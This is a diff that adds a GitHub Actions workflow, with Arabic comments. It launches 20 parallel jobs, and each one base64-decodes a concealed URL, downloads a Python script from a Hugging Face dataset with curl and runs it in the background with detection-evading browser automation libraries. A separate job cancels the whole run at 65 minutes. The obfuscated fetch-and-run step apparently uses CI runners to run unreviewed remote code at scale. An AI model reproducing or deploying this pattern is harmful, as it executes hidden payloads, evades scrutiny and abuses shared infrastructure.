@@ -1,0 +1,107 @@
+name: Linux Integrated Task Legion
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: integrated-legion-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مأمور المحو الشامل: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  erasure-supervisor:
+    name: "Erasure Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Execute Full Erasure Directive
+        run: |
+          echo "[SUPERVISOR] Erasure supervisor in command. Complete wipeout armed at the 65-minute marker."
+          echo "[SUPERVISOR] Reading workflow serial: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[SUPERVISOR] Marker reached! Executing full erasure directive..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[SUPERVISOR] Full erasure directive executed. Every operating and queued unit will be erased."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الفيلق
+  # =================================================================
+  organize-legion:
+    name: "LegionUnit-${{ matrix.unit_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_key: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      # ⟥ الطور الأول: تركيب البنية الأولية
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      - name: Erect Initial Structure
+        run: |
+          echo "[ERECT] Erecting initial structure for LegionUnit-${{ matrix.unit_key }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      # ⟥ الطور الثاني: انتشال ملف التشغيل
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      - name: Retrieve Operation Script
+        run: |
+          echo "[RETRIEVE] Retrieving app_task.py from designated storage archive..."
+          STORAGE_ARCHIVE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$STORAGE_ARCHIVE" -o app_task.py
+          echo "[RETRIEVE] Operation script retrieved successfully."
+
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      # ⟥ الطور الثالث: ربط الحزم الإضافية
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      - name: Link Supplementary Libraries
+        run: |
+          echo "[LINK] Linking supplementary libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      # ⟥ الطور الرابع: التنفيذ المحصور زمنياً (65 دقيقة)
+      # ⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖⬖
+      - name: Execute Locked Window Operation
+        run: |
+          echo ">> Organizing LegionUnit-${{ matrix.unit_key }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          LEGION_PID=$!
+          
+          echo ">> Locked window engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $LEGION_PID 2>/dev/null; then
+            echo ">> Locked window expired! Retiring operation..."
+            kill -9 $LEGION_PID
+            echo ">> Operation retired by window keeper."
+          else
+            echo ">> Operation closed within locked window."
+          fi
